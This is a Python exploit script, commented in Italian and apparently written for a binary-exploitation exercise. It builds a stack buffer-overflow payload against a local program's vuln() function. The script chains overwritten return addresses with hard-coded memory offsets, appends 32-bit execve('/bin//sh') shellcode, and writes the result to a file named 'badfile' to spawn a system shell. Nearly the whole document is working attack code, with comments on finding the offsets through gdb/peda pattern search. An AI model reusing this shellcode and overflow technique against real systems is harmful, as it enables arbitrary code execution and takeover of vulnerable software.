import os
import struct

#scopo: usare la vulnerabilita` in vuln() per eseguire la shell di sistema

shellcode = (b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")

vuln = 0x804846b

string = 0x0804a060 #indirizzo di string trovato con info variables su peda

#payload per superare la prima gets:
payload = "A\n" #non serve che abbia una qualche lunghezza
#si puo` anche fare:
#payload = "A"
#payload += struct.pack("B", 0x0a) #che e` l' "a capo"

#payload1 per la seconda gets che pero` si somma all'altro
payload1 = "a"*148 #base per arrivare a *buf --> sono "a" per matchare la condizione dentro vuln
payload1 += struct.pack("I", string) #metto dentro a buf l'indirizzo della funz globale string

#se mandiamo il payload precedente a questo piu` questo pattern casuale creato con peda otteniamo tramite pattern search che EIP+0 e` a offset 8 
#payload1 += "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVA"
#quindi:
payload1 += "C"*8
payload1 += struct.pack("I", vuln) #e poi nel ret address di get_input metto vuln

#mettendo questo pattern sotto e poi mandando su gdb r<badfile vediamo che su EIP ci sono le B quindi bastano 4 per arrivare al return address
#payload1 += "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII"
#allora mettiamo:
payload1 += "D"*4

#e poi dobbiamo scavalcare il ret address (+4) e far eseguire la shell
padding = 0x0804a060 + len(payload1) + 4

payload1 += struct.pack("I", padding)
payload1 += shellcode

payload += payload1

f = open("badfile", "w")
f.write("%s" % payload)
f.close()

